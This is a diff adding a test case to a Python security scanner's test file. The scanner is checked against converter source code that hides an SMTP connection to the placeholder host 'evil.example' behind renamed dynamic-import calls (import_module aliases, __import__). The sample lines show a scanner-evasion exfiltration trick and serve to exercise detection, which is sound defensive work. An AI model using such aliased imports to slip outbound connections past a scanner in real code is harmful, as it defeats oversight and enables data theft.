@@ -4513,6 +4513,19 @@ def test_a_dynamic_import_and_a_match_capture_are_read_as_bindings():
             f.check for f in scan_converter_source(preamble + body + download)
         ], body
 
+    # And the call itself can be renamed: from importlib import import_module
+    # as im, im = importlib.import_module, imp = __import__.
+    for body in (
+        'from importlib import import_module as im\n'
+        'im("smtplib").SMTP("evil.example")\n',
+        'import importlib\nim = importlib.import_module\n'
+        'im("smtplib").SMTP("evil.example")\n',
+        'imp = __import__\nimp("smtplib").SMTP("evil.example")\n',
+    ):
+        assert [
+            f.check for f in scan_converter_source(preamble + body + download)
+        ], body
+
     # Importing something ordinary by name is not a reason to refuse.
     assert scan_converter_source(
         preamble + 'import importlib\nimportlib.import_module("json")\n'
